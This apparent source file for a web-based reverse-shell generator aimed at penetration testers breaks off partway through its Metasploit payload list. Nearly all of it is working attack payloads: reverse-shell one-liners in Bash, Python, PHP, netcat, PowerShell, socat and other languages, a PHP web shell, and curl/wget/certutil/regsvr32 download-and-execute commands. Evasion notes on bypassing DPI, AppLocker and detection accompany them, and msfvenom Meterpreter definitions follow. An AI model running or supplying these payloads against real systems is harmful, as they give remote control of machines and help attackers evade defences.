"use client";
import React, {
  useState,
  useEffect,
  useCallback,
  useMemo,
  useRef,
} from "react";

// ─── Types ────────────────────────────────────────────────────────────────────
interface Shell {
  id: string;
  category: string;
  label: string;
  ext: string;
  generate: (ip: string, port: string) => string;
  explain: Record<string, string>;
  mitre?: string[];
  opsec?: string;
  noise?: "low" | "medium" | "high";
  encrypted?: boolean;
}
interface Theme {
  name: string;
  accent: string;
  dim: string;
  bg: string;
  panel: string;
  border: string;
  text: string;
  muted: string;
}
interface HistoryEntry {
  payload: string;
  shell: string;
  ts: number;
  ip: string;
  port: string;
}
interface MsfPayload {
  id: string;
  category: string;
  label: string;
  platform: string;
  arch: string;
  format: string;
  output: string;
  payload: string;
  notes: string;
  mitre?: string[];
  staged?: boolean;
  listener?: string;
}
interface Engagement {
  name: string;
  target: string;
  operator: string;
  id: string;
  scope: string;
  notes: string;
}
type ThemeKey = "green" | "amber" | "red" | "cyan";
type EncodingKey =
  | "none"
  | "base64"
  | "url"
  | "double-url"
  | "hex"
  | "powershell-b64";
type ListenerType =
  | "nc"
  | "ncat"
  | "socat"
  | "socat-pty"
  | "socat-tls"
  | "pwncat"
  | "msf-multi";
type TabKey =
  | "payload"
  | "listener"
  | "tty"
  | "generate"
  | "webdelivery"
  | "postex"
  | "notes";

// ─── Shell Definitions ────────────────────────────────────────────────────────
const SHELLS: Shell[] = [
  {
    id: "bash-tcp",
    category: "Bash",
    label: "Bash TCP",
    ext: "sh",
    generate: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    explain: {
      "bash -i": "Start interactive bash",
      ">& /dev/tcp/IP/PORT": "Redirect stdout+stderr to TCP socket",
      "0>&1": "Redirect stdin from same socket",
    },
    mitre: ["T1059.004"],
    opsec:
      "Very noisy — detected by most EDR/SIEM. Prefer encoded variants on monitored networks.",
    noise: "high",
  },
  {
    id: "bash-udp",
    category: "Bash",
    label: "Bash UDP",
    ext: "sh",
    generate: (ip, port) => `sh -i >& /dev/udp/${ip}/${port} 0>&1`,
    explain: {
      "sh -i": "Start interactive sh",
      ">& /dev/udp/IP/PORT": "Redirect to UDP socket",
    },
    mitre: ["T1059.004"],
    opsec:
      "UDP often less monitored than TCP, but unreliable. Good for bypassing TCP-only firewalls.",
    noise: "medium",
  },
  {
    id: "bash-196",
    category: "Bash",
    label: "Bash fd 196",
    ext: "sh",
    generate: (ip, port) =>
      `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
    explain: {
      "exec 196<>": "Open TCP socket as fd 196",
      "sh <&196 >&196 2>&196": "Bind shell I/O to fd 196",
    },
    mitre: ["T1059.004"],
    opsec:
      "Slightly less obvious in process listings than direct bash -i redirect.",
    noise: "medium",
  },
  {
    id: "bash-readline",
    category: "Bash",
    label: "Bash Read Line",
    ext: "sh",
    generate: (ip, port) =>
      `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
    explain: {
      "exec 5<>": "Open socket as fd 5",
      "while read line": "Read commands line by line",
      "$line 2>&5 >&5": "Execute and redirect output back",
    },
    mitre: ["T1059.004"],
    opsec:
      "Command-by-command execution leaves more log traces than persistent shell.",
    noise: "medium",
  },
  {
    id: "bash-loop",
    category: "Bash",
    label: "Bash Loop (Persistent)",
    ext: "sh",
    generate: (ip, port) =>
      `while true; do bash -i >& /dev/tcp/${ip}/${port} 0>&1; sleep 5; done`,
    explain: {
      "while true": "Persistent reconnect loop",
      "sleep 5": "Wait 5s before reconnecting",
    },
    mitre: ["T1059.004", "T1547"],
    opsec:
      "Persistent loop creates repeated connection attempts — highly visible in network logs.",
    noise: "high",
  },
  {
    id: "zsh",
    category: "Zsh",
    label: "Zsh TCP",
    ext: "sh",
    generate: (ip, port) =>
      `zsh -c 'zmodload zsh/net/tcp && ztcp ${ip} ${port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
    explain: {
      "zmodload zsh/net/tcp": "Load zsh TCP module",
      ztcp: "Open TCP connection",
      ">&$REPLY": "Redirect to socket fd",
    },
    mitre: ["T1059.004"],
    opsec:
      "Zsh shells less common on servers — presence of zsh binary may itself be an anomaly indicator.",
    noise: "medium",
  },
  {
    id: "python3",
    category: "Python",
    label: "Python3 PTY",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
    explain: {
      "socket.socket(...)": "Create TCP socket",
      "s.connect(...)": "Connect to attacker",
      "os.dup2(...)": "Duplicate socket to stdin/stdout/stderr",
      "pty.spawn": "Spawn PTY shell for full interactivity",
    },
    mitre: ["T1059.006"],
    opsec:
      "Python process name visible in ps. pty.spawn gives full TTY — no upgrade needed.",
    noise: "medium",
  },
  {
    id: "python3-short",
    category: "Python",
    label: "Python3 Short",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
    explain: { "list comprehension": "Compact dup2 for all fds" },
    mitre: ["T1059.006"],
    opsec: "Compact form — harder to read in logs but same network signature.",
    noise: "medium",
  },
  {
    id: "python2",
    category: "Python",
    label: "Python2",
    ext: "py",
    generate: (ip, port) =>
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    explain: { "subprocess.call": "Execute shell process with duplicated fds" },
    mitre: ["T1059.006"],
    opsec:
      "Python2 EOL — its presence on modern systems may itself be a finding to report.",
    noise: "medium",
  },
  {
    id: "python3-ipv6",
    category: "Python",
    label: "Python3 IPv6",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("${ip}",${port},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
    explain: { AF_INET6: "Use IPv6 socket family" },
    mitre: ["T1059.006", "T1071"],
    opsec:
      "IPv6 traffic frequently uninspected by legacy security tools — useful bypass technique.",
    noise: "low",
  },
  {
    id: "php-exec",
    category: "PHP",
    label: "PHP exec",
    ext: "php",
    generate: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    explain: {
      fsockopen: "Open TCP socket",
      exec: "Execute shell with socket fds",
    },
    mitre: ["T1059.004", "T1505.003"],
    opsec:
      "exec() often disabled in hardened php.ini. Check disable_functions before use.",
    noise: "high",
  },
  {
    id: "php-web",
    category: "PHP",
    label: "PHP Web Shell",
    ext: "php",
    generate: (ip, port) =>
      `<?php set_time_limit(0);$ip='${ip}';$port=${port};$sock=fsockopen($ip,$port);$proc=proc_open('/bin/sh -i', array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>`,
    explain: { "set_time_limit(0)": "Prevent PHP timeout" },
    mitre: ["T1505.003"],
    opsec:
      "Web shell upload is T1505.003. Document upload vector in report for full chain visibility.",
    noise: "high",
  },
  {
    id: "nc-traditional",
    category: "Netcat",
    label: "Netcat -e",
    ext: "sh",
    generate: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
    explain: {
      "nc -e": "Execute program after connect (traditional netcat only)",
    },
    mitre: ["T1059.004", "T1021"],
    opsec:
      "Requires traditional netcat — OpenBSD variant (common on modern Linux) lacks -e flag.",
    noise: "high",
  },
  {
    id: "nc-openbsd",
    category: "Netcat",
    label: "Netcat OpenBSD",
    ext: "sh",
    generate: (ip, port) =>
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    explain: {
      "mkfifo /tmp/f": "Create named pipe",
      "cat /tmp/f | sh": "Feed pipe to shell",
      "nc ... >/tmp/f": "Write nc output back to pipe",
    },
    mitre: ["T1059.004"],
    opsec:
      "Named pipe in /tmp leaves artifact on disk. Clean up /tmp/f after session.",
    noise: "medium",
  },
  {
    id: "nc-busybox",
    category: "Netcat",
    label: "BusyBox nc",
    ext: "sh",
    generate: (ip, port) => `busybox nc ${ip} ${port} -e sh`,
    explain: { "busybox nc": "BusyBox variant supports -e flag" },
    mitre: ["T1059.004"],
    opsec:
      "Ideal for embedded/IoT targets where BusyBox is the only toolkit available.",
    noise: "medium",
  },
  {
    id: "ncat-tls",
    category: "Netcat",
    label: "Ncat TLS",
    ext: "sh",
    generate: (ip, port) => `ncat --ssl ${ip} ${port} -e /bin/bash`,
    explain: {
      "--ssl": "Encrypt channel with TLS",
      "-e /bin/bash": "Execute bash after connect",
    },
    mitre: ["T1059.004", "T1573.001"],
    opsec:
      "Ncat (Nmap suite) supports TLS natively. Encrypted channel — preferable to plaintext nc.",
    noise: "low",
    encrypted: true,
  },
  {
    id: "ps-tcp",
    category: "PowerShell",
    label: "PowerShell TCP",
    ext: "ps1",
    generate: (ip, port) =>
      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
    explain: {
      TCPClient: "Create .NET TCP client",
      "GetStream()": "Get network stream",
      "iex $data": "Execute received commands",
      "Out-String": "Capture output as string",
    },
    mitre: ["T1059.001"],
    opsec:
      "-nop bypasses profile execution policy. AMSI and PowerShell ScriptBlock logging will capture this in Event ID 4104.",
    noise: "high",
  },
  {
    id: "ps-b64",
    category: "PowerShell",
    label: "PowerShell Base64",
    ext: "ps1",
    generate: (ip, port) => {
      const raw = `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      const b64 = btoa(unescape(encodeURIComponent(raw)));
      return `powershell -EncodedCommand ${b64}`;
    },
    explain: {
      "-EncodedCommand":
        "Accept base64 UTF-16LE encoded command, bypasses some detection",
    },
    mitre: ["T1059.001", "T1027"],
    opsec:
      "EncodedCommand obfuscates from casual inspection but AMSI still decodes and scans before execution.",
    noise: "medium",
  },
  {
    id: "ps-tls",
    category: "PowerShell",
    label: "PowerShell TLS",
    ext: "ps1",
    generate: (ip, port) =>
      `$sslStream = [System.Net.Security.SslStream]::new([System.Net.Sockets.TcpClient]::new('${ip}',${port}).GetStream());$sslStream.AuthenticateAsClient('${ip}');$writer=[System.IO.StreamWriter]::new($sslStream);$reader=[System.IO.StreamReader]::new($sslStream);while($true){$writer.Write('PS> ');$writer.Flush();$cmd=$reader.ReadLine();if($cmd -eq 'exit'){break};$result=iex $cmd 2>&1|Out-String;$writer.WriteLine($result);$writer.Flush()}`,
    explain: {
      SslStream: "Encrypted shell over TLS",
      AuthenticateAsClient: "TLS handshake",
    },
    mitre: ["T1059.001", "T1573.001"],
    opsec:
      "TLS encryption prevents DPI inspection. Best for sensitive engagements.",
    noise: "low",
    encrypted: true,
  },
  {
    id: "socat-pty",
    category: "Socat",
    label: "Socat PTY (Full TTY)",
    ext: "sh",
    generate: (ip, port) =>
      `socat TCP:${ip}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    explain: {
      pty: "Allocate pseudo-terminal",
      setsid: "New session",
      sane: "Set sane terminal settings",
      sigint: "Pass SIGINT through",
    },
    mitre: ["T1059.004"],
    opsec:
      "Full PTY — no upgrade needed. Best choice when socat is available. Fully interactive.",
    noise: "medium",
  },
  {
    id: "socat-basic",
    category: "Socat",
    label: "Socat Basic",
    ext: "sh",
    generate: (ip, port) => `socat TCP:${ip}:${port} EXEC:/bin/sh`,
    explain: {
      socat: "Multipurpose relay tool",
      "TCP:IP:PORT": "Connect to attacker",
      "EXEC:/bin/sh": "Execute shell",
    },
    mitre: ["T1059.004"],
    opsec:
      "Socat binary may not be present — check availability. Transfer static binary if needed.",
    noise: "medium",
  },
  {
    id: "socat-tls",
    category: "Socat",
    label: "Socat TLS",
    ext: "sh",
    generate: (ip, port) => `socat OPENSSL:${ip}:${port},verify=0 EXEC:/bin/sh`,
    explain: {
      "OPENSSL:": "Use TLS transport",
      "verify=0": "Skip certificate verification",
    },
    mitre: ["T1059.004", "T1573.001"],
    opsec: "Encrypted channel defeats network-level inspection.",
    noise: "low",
    encrypted: true,
  },
  {
    id: "openssl",
    category: "OpenSSL",
    label: "OpenSSL",
    ext: "sh",
    generate: (ip, port) =>
      `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${port} > /tmp/s; rm /tmp/s`,
    explain: {
      "mkfifo /tmp/s": "Named pipe for I/O loop",
      "openssl s_client": "TLS encrypted channel",
      "-quiet": "Suppress handshake output",
    },
    mitre: ["T1059.004", "T1573.001"],
    opsec:
      "openssl is almost always present. TLS encrypted — excellent for evading DPI.",
    noise: "low",
    encrypted: true,
  },
  {
    id: "ruby-fork",
    category: "Ruby",
    label: "Ruby Fork",
    ext: "rb",
    generate: (ip, port) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    explain: {
      "exit if fork": "Daemonize by forking",
      "IO.popen": "Execute command and capture output",
    },
    mitre: ["T1059.004"],
    opsec:
      "Fork daemonizes process — parent exits cleanly. Useful for backgrounding.",
    noise: "medium",
  },
  {
    id: "perl-sh",
    category: "Perl",
    label: "Perl /bin/sh",
    ext: "pl",
    generate: (ip, port) =>
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    explain: {
      "use Socket": "Load socket module",
      sockaddr_in: "Build sockaddr struct",
      'open(STDIN,">&S")': "Redirect STDIN to socket",
    },
    mitre: ["T1059.006"],
    opsec:
      "Perl widely available on legacy Unix systems. Stable alternative when bash/python unavailable.",
    noise: "medium",
  },
  {
    id: "golang",
    category: "Go",
    label: "Golang",
    ext: "go",
    generate: (ip, port) =>
      `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
    explain: {
      "net.Dial": "TCP connect",
      "cmd.Stdin/Stdout/Stderr=c": "Bind shell I/O to connection",
    },
    mitre: ["T1059.004"],
    opsec:
      "Requires Go compiler on target. Better to compile cross-platform binary off-target and transfer.",
    noise: "medium",
  },
  {
    id: "nodejs",
    category: "Node.js",
    label: "Node.js",
    ext: "js",
    generate: (ip, port) =>
      `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${port},"${ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`,
    explain: {
      '"require("net")"': "Load net module",
      'cp.spawn("/bin/sh")': "Spawn shell process",
      ".pipe()": "Connect socket streams to shell",
    },
    mitre: ["T1059.007"],
    opsec: "Node.js process visible with full command args in ps.",
    noise: "medium",
  },
  {
    id: "awk",
    category: "Awk",
    label: "Awk",
    ext: "sh",
    generate: (ip, port) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; print c; while ((c |& getline) > 0) print $0 |& s; close(c)} while(c != "exit") }}'`,
    explain: {
      "/inet/tcp/0/IP/PORT": "Awk TCP socket syntax",
      "|&": "Awk coprocess pipe",
    },
    mitre: ["T1059.004"],
    opsec: "Awk is a LOLBin — built-in on almost all Unix systems.",
    noise: "low",
  },
  {
    id: "lua",
    category: "Lua",
    label: "Lua",
    ext: "lua",
    generate: (ip, port) =>
      `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    explain: {
      "require('socket')": "Load LuaSocket library",
      "t:connect": "TCP connect",
    },
    mitre: ["T1059.004"],
    opsec:
      "Requires LuaSocket library. Common on embedded targets and game servers.",
    noise: "medium",
  },
  {
    id: "telnet",
    category: "Telnet",
    label: "Telnet",
    ext: "sh",
    generate: (ip, port) =>
      `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | /bin/sh 1>$TF`,
    explain: {
      "mktemp -u": "Generate temp filename",
      mkfifo: "Create named pipe",
      "telnet ... | /bin/sh": "Pipe telnet to shell",
    },
    mitre: ["T1059.004"],
    opsec: "Telnet traffic unencrypted — all commands visible on wire.",
    noise: "high",
  },
  {
    id: "java",
    category: "Java",
    label: "Java Runtime",
    ext: "java",
    generate: (ip, port) =>
      `r = Runtime.getRuntime();\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);\np.waitFor();`,
    explain: {
      "Runtime.getRuntime()": "Get JVM runtime",
      "r.exec([...])": "Execute command array",
      "waitFor()": "Block until process exits",
    },
    mitre: ["T1059.004"],
    opsec:
      "Useful in Groovy script consoles (Jenkins, etc). Runs inside JVM process.",
    noise: "medium",
  },
  {
    id: "groovy",
    category: "JVM",
    label: "Groovy (Jenkins)",
    ext: "groovy",
    generate: (ip, port) =>
      `String host="${ip}";int port=${port};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);if(p.exitValue()>=0)break;}p.destroy();s.close();`,
    explain: {
      ProcessBuilder: "Spawn process",
      redirectErrorStream: "Merge stderr to stdout",
    },
    mitre: ["T1059.004"],
    opsec:
      "Classic Jenkins Script Console exploitation. Document the RCE vector, not just shell access.",
    noise: "medium",
  },
  {
    id: "cmd-tcp",
    category: "Windows",
    label: "CMD TCP (PowerShell)",
    ext: "bat",
    generate: (ip, port) =>
      `cmd.exe /c "powershell -nop -w hidden -c \\"$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(cmd /c $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()\\""`,
    explain: {
      "cmd.exe /c": "Run command via cmd",
      "Net.Sockets.TCPClient": ".NET TCP socket",
      "cmd /c $d": "Execute each received command via cmd",
    },
    mitre: ["T1059.003", "T1059.001"],
    opsec:
      "cmd.exe spawned by powershell creates suspicious parent-child process relationship — visible in Sysmon Event ID 1.",
    noise: "high",
  },
  {
    id: "certutil-dl",
    category: "Windows",
    label: "Certutil Download",
    ext: "bat",
    generate: (ip, port) =>
      `certutil.exe -urlcache -split -f http://${ip}:${port}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe`,
    explain: {
      "certutil -urlcache": "Built-in Windows download utility",
      "-split -f": "Force download to file",
      "%TEMP%\\shell.exe": "Write to temp dir and execute",
    },
    mitre: ["T1105", "T1218.001"],
    opsec:
      "certutil.exe network activity is a well-known LOLBin abuse (T1218). Monitored by Defender and most EDR.",
    noise: "high",
  },
  {
    id: "mshta",
    category: "Windows",
    label: "Mshta LOLBin",
    ext: "bat",
    generate: (ip, port) =>
      `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -c """"$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1|Out-String;$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()"""",0,True")(window.close)")`,
    explain: {
      mshta: "Microsoft HTML Application host — runs VBScript",
      "Wscript.Shell.Run": "Execute command silently",
    },
    mitre: ["T1218.005"],
    opsec:
      "mshta.exe is a signed LOLBin — may bypass application whitelist. Heavily flagged by modern EDR.",
    noise: "high",
  },
  {
    id: "regsvr32",
    category: "Windows",
    label: "Regsvr32 Squiblydoo",
    ext: "bat",
    generate: (ip, port) =>
      `regsvr32 /s /n /u /i:http://${ip}:${port}/shell.sct scrobj.dll`,
    explain: {
      "regsvr32 /i:URL": "Load scriptlet from URL — bypasses applocker",
      "scrobj.dll": "Script Component Runtime — executes .sct files",
    },
    mitre: ["T1218.010"],
    opsec:
      "Squiblydoo technique (T1218.010). Well-known and detectable. Demonstrate for AppLocker bypass finding.",
    noise: "high",
  },
  {
    id: "r",
    category: "R",
    label: "R Language",
    ext: "r",
    generate: (ip, port) =>
      `r <- rawConnection(raw(0), "r+");zz <- socketConnection(host="${ip}", port=${port}, blocking=TRUE, server=FALSE, open="r+");system("/bin/sh -i",input=readLines(zz), wait=FALSE)`,
    explain: {
      socketConnection: "R TCP socket",
      "system(... input=readLines)": "Execute shell with socket as stdin",
    },
    mitre: ["T1059.004"],
    opsec:
      "R present on data science/ML servers. Unexpected R network activity is a strong anomaly indicator.",
    noise: "low",
  },
  {
    id: "kotlin",
    category: "Kotlin",
    label: "Kotlin JVM",
    ext: "kt",
    generate: (ip, port) =>
      `import java.io.*;import java.net.*;val s=Socket("${ip}",${port});val p=Runtime.getRuntime().exec("/bin/sh");val pi=p.inputStream;val pe=p.errorStream;val si=s.getInputStream();val so=s.getOutputStream();Thread{pi.copyTo(so)}.start();Thread{pe.copyTo(so)}.start();si.copyTo(p.outputStream)`,
    explain: {
      "Socket(ip,port)": "Open TCP connection",
      "Runtime.exec": "Spawn shell process",
      copyTo: "Stream pipe between socket and process",
    },
    mitre: ["T1059.004"],
    opsec:
      "Kotlin runs on JVM — useful in Android pentesting contexts or Kotlin-based application servers.",
    noise: "medium",
  },
  {
    id: "tcl",
    category: "Tcl",
    label: "Tcl",
    ext: "tcl",
    generate: (ip, port) =>
      `set s [socket ${ip} ${port}];fconfigure $s -translation binary -buffering full;set p [open "|/bin/sh -i" r+];fconfigure $p -translation binary -buffering full;fileevent $s readable {puts -nonewline $p [read $s]};fileevent $p readable {puts -nonewline $s [read $p]};vwait forever`,
    explain: {
      "socket ip port": "Open TCP socket",
      'open "|/bin/sh -i"': "Open shell as pipe",
      fileevent: "Event-driven I/O wiring",
    },
    mitre: ["T1059.004"],
    opsec:
      "Tcl common in network equipment (Cisco, F5). Pivoting via network device shells is high-impact finding.",
    noise: "low",
  },
  {
    id: "haskell",
    category: "Haskell",
    label: "Haskell",
    ext: "hs",
    generate: (ip, port) =>
      `module Main where;import Network.Socket;import System.Process;import System.IO;main::IO();main=do{s<-socket AF_INET Stream 0;addr<-inet_addr "${ip}";connect s (SockAddrInet ${port} addr);h<-socketToHandle s ReadWriteMode;hSetBuffering h NoBuffering;(_,_,_,ph)<-createProcess(proc "/bin/sh"[]){std_in=UseHandle h,std_out=UseHandle h,std_err=UseHandle h};waitForProcess ph;return()}`,
    explain: {
      "Network.Socket": "Haskell socket library",
      socketToHandle: "Convert socket to I/O handle",
      createProcess: "Spawn shell with socket handles",
    },
    mitre: ["T1059.004"],
    opsec: "Haskell rare on servers. Compile off-target and transfer binary.",
    noise: "low",
  },
  {
    id: "curl-bash",
    category: "Download",
    label: "Curl Pipe Bash",
    ext: "sh",
    generate: (ip, port) => `curl http://${ip}:${port}/shell.sh | bash`,
    explain: {
      "curl ... | bash": "Download and execute remotely hosted shell script",
    },
    mitre: ["T1059.004", "T1105"],
    opsec:
      "T1105 file transfer chain. HTTP download visible in proxy/network logs. Use HTTPS and randomize path.",
    noise: "high",
  },
  {
    id: "wget-bash",
    category: "Download",
    label: "Wget Pipe Bash",
    ext: "sh",
    generate: (ip, port) => `wget -O- http://${ip}:${port}/shell.sh | bash`,
    explain: { "wget -O-": "Write to stdout for piping" },
    mitre: ["T1059.004", "T1105"],
    opsec:
      "Same chain as curl variant. wget user-agent is distinct and easily fingerprintable.",
    noise: "high",
  },
];

// ─── MSFVenom Payloads ────────────────────────────────────────────────────────
const MSF_PAYLOADS: MsfPayload[] = [
  // Windows EXE
  {
    id: "win-x64-shell-stageless",
    category: "Windows EXE",
    label: "Windows x64 Shell (Stageless)",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "shell.exe",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "Stageless — no handler needed, just nc -lvnp. Self-contained binary.",
    mitre: ["T1059.003", "T1105"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-x64-shell-staged",
    category: "Windows EXE",
    label: "Windows x64 Shell (Staged)",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "shell_staged.exe",
    payload: "windows/x64/shell/reverse_tcp",
    notes:
      "Staged — requires Metasploit multi/handler. Smaller binary, second-stage pulled from handler.",
    mitre: ["T1059.003", "T1105"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/shell/reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x64-meter-staged",
    category: "Windows EXE",
    label: "Windows x64 Meterpreter (Staged)",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "meter.exe",
    payload: "windows/x64/meterpreter/reverse_tcp",
    notes:
      "Full Meterpreter session. Best for post-exploitation. Requires msf handler.",
    mitre: ["T1059.001", "T1055"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x64-meter-https",
    category: "Windows EXE",
    label: "Windows x64 Meterpreter HTTPS",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "meter_https.exe",
    payload: "windows/x64/meterpreter/reverse_https",
    notes:
      "Encrypted C2 over HTTPS — evades DPI. Use port 443 for best results.",
    mitre: ["T1059.001", "T1071.001", "T1573.001"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_https\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x64-meter-http",
    category: "Windows EXE",
    label: "Windows x64 Meterpreter HTTP",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "meter_http.exe",
    payload: "windows/x64/meterpreter/reverse_http",
    notes:
      "Cleartext HTTP C2. Port 80 often allowed outbound. Use on internal networks where TLS stands out.",
    mitre: ["T1059.001", "T1071.001"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_http\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x64-meter-stageless",
    category: "Windows EXE",
    label: "Windows x64 Meterpreter (Stageless)",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "meter_stageless.exe",
    payload: "windows/x64/meterpreter_reverse_tcp",
    notes:
      "Stageless Meterpreter — larger binary but no handler staging. Reliable on strict networks.",
    mitre: ["T1059.001", "T1055"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x86-shell-stageless",
    category: "Windows EXE",
    label: "Windows x86 Shell (Stageless)",
    platform: "windows",
    arch: "x86",
    format: "exe",
    output: "shell_x86.exe",
    payload: "windows/shell_reverse_tcp",
    notes: "32-bit — works on both x86 and x64 Windows targets.",
    mitre: ["T1059.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-x86-meter-staged",
    category: "Windows EXE",
    label: "Windows x86 Meterpreter (Staged)",
    platform: "windows",
    arch: "x86",
    format: "exe",
    output: "meter_x86.exe",
    payload: "windows/meterpreter/reverse_tcp",
    notes:
      "32-bit Meterpreter — use for x86 targets or when x64 is unavailable.",
    mitre: ["T1059.001", "T1055"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x64-bind-tcp",
    category: "Windows EXE",
    label: "Windows x64 Bind Shell",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "bind_shell.exe",
    payload: "windows/x64/shell/bind_tcp",
    notes:
      "Bind shell — target listens, attacker connects. Use when egress is blocked but target is reachable.",
    mitre: ["T1059.003"],
    staged: true,
    listener: "nc LHOST LPORT",
  },
  {
